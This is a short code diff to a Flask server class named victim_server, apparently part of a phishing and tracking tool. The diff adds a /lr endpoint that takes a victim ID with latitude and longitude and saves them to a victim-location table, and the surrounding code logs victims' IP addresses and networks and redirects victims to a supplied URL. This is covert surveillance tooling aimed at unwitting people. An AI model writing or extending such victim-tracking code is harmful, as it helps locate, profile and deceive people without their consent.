@@ -78,6 +78,15 @@ class victim_server(object):
             db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
         return json.dumps({'status' : 'OK', 'vId' : vId});
 
+    @app.route("/lr", methods=["POST"])
+    def locationRegister():
+        vId = request.form['vId']
+        lat = request.form['lat']
+        lon = request.form['lon']
+
+        db.sentences_victim('location_victim', [vId, lat, lon], 2)
+        return json.dumps({'status' : 'OK', 'vId' : vId});
+
     @app.route("/redv")
     def redirectVictim():
         url = request.args.get('url')
